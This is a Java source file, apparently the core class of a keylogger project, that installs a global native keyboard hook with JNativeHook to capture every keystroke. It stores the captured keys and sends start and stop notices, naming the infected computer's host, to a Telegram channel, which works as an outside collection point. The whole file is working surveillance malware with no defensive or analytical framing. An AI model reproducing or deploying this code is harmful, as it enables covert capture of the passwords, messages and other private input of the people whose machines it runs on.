package com.schnarre.keylogger;

import com.schnarre.keylogger.listener.KeyListener;
import com.schnarre.keylogger.telegram.TelegramManager;
import lombok.Getter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by IntelliJ IDEA
 * User: schnarrenils
 * Date: 04.01.2023
 * Time: 00:52
 */

public class KeyLogger {
    @Getter
    private static List<String> loggedKeys = new ArrayList<>();
    @Getter
    private static int counter;
    @Getter
    private static final System.Logger logger = System.getLogger(GlobalScreen.class.getPackage().getName());
    @Getter
    private static TelegramManager telegramManager;

    public static void initKeyLogger() {
        telegramManager = new TelegramManager();
        logger.isLoggable(System.Logger.Level.OFF);
        counter = 0;
        GlobalScreen.addNativeKeyListener(new KeyListener());
        try {
            telegramManager.sendMessage("[✓] Keylogger gestartet auf Computer: " + InetAddress.getLocalHost());
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException exception) {
            shutdown();
        }

    }

    public static void shutdown() {
        try {
            telegramManager.sendMessage("[X] Keylogger gestoppt auf Computer: " + InetAddress.getLocalHost());
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
        System.exit(0);
    }
}
